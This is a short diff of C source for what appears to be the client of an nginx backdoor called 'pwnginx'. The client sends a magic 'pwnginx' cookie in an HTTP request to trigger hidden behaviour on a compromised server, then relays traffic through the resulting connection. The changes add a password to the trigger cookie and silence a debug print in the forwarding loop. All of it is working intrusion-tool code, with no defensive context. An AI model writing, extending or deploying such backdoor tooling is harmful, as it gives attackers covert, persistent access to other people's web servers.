@@ -22,6 +22,7 @@
 
 extern char *ip;
 extern char *port;
+extern char *password;
 
 
 int full_send(int fd,void *buf,int size)
@@ -66,7 +67,7 @@ int init_connection(char *ip,char *port,int function)
 
     char *buf = malloc(100);
     memset(buf,0,100);
-    sprintf(buf,"GET / HTTP/1.1\r\nHost: %s\r\nCookie: pwnginx=on; action=%d\r\n\r\n",ip,function);
+    sprintf(buf,"GET / HTTP/1.1\r\nHost: %s\r\nCookie: pwnginx=%s; action=%d\r\n\r\n", ip, password, function);
     full_send(server,buf,strlen(buf));
     full_recv(server,buf,9);
     if(strncmp(buf,"pwnginx",7)!=0){
@@ -93,7 +94,7 @@ int forwarder(int from,int to)
         if(FD_ISSET(from,&rfds)){
             if ((rec = read(from, buffer, BUFSIZ)) > 0){
                 sen=write(to, &buffer, rec);
-                printf("%d => %d\n",rec,sen);
+                //printf("%d => %d\n",rec,sen);
                 if(sen<=0) {
                     //printf("::1::%d::\n",sen);
                     break;
